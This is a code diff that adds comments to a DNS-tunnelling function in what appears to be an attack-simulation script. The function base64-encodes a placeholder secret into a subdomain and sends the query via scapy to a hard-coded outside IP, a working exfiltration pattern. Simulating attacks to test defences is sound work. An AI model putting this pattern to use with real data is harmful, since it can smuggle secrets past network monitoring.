@@ -386,14 +386,15 @@ def ransomware_simulation():
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
     try:
-        text = "testSuperSecretCode"
-        text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
-        text_str = text_bytes.decode("ascii")   
-        qname = f"{text_str}.dns.bitlus.online"
+        text = "testSuperSecretCode" # Example data to be encoded
+        text_bytes = base64.urlsafe_b64encode(text.encode("ascii")) # Convert to base64 bytes
+        text_str = text_bytes.decode("ascii") # Decode bytes to string, safe for DNS queries   
+        qname = f"{text_str}.dns.bitlus.online" 
         # Have to point the DNS request directly to our server, 
         # Should work if our DNS server was a Authoritative one 
+        # Uses scapy inet IP to prepare the DNS request
         dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
-        answer = sr1(dns_req, verbose=1, timeout=5)
+        answer = sr1(dns_req, verbose=1, timeout=5) # sr1 sends the DNS requests and waits for repsonse
         if answer:
             answer.show()  # This prints the entire DNS response
             print(f"DNS Tunneling successful")
